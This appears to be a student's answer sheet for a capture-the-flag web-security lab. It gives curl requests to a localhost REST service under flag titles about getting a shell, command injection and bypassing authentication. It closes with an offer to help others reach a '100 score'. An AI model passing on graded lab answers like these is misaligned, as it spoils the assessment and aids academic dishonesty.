# FLAG 1: Environment Echo
  curl 'http://localhost:8080/rest/users/ping' -H 'GATECH_ID:123456789' -H 'Accept:application/json'

# FLAG 2: Get a Shell
  curl 'http://localhost:8080/rest/users/ping' -H 'GATECH_ID:123456789' -H 'Accept:application/json'

# FLAG 3: Command and Concat
  curl 'http://localhost:8080/rest/users/user/updateuser' -H 'GATECH_ID:123456789' -H 'Content-Type:application/json' -H 'X-UserName:rcoleman8' --data-raw '{"id": 1,"name": "User Name","profession": "User Profession"}'

# FLAG 4: Bypass Authentication 
  curl 'http://localhost:8080/rest/users/userlist' -H 'GATECH_ID:123456789' -H 'Accept:application/json' -H 'X-UserName:rcoleman8'

# FLAG 5: Infiltrate the Admin Users
  curl 'http://localhost:8080/rest/users/user/?userId=1' -H 'GATECH_ID:123456789' -H 'X-UserName:rcoleman8' 

<font color=Red>if you hava any question, contact me.
I promise 100 score.</font>

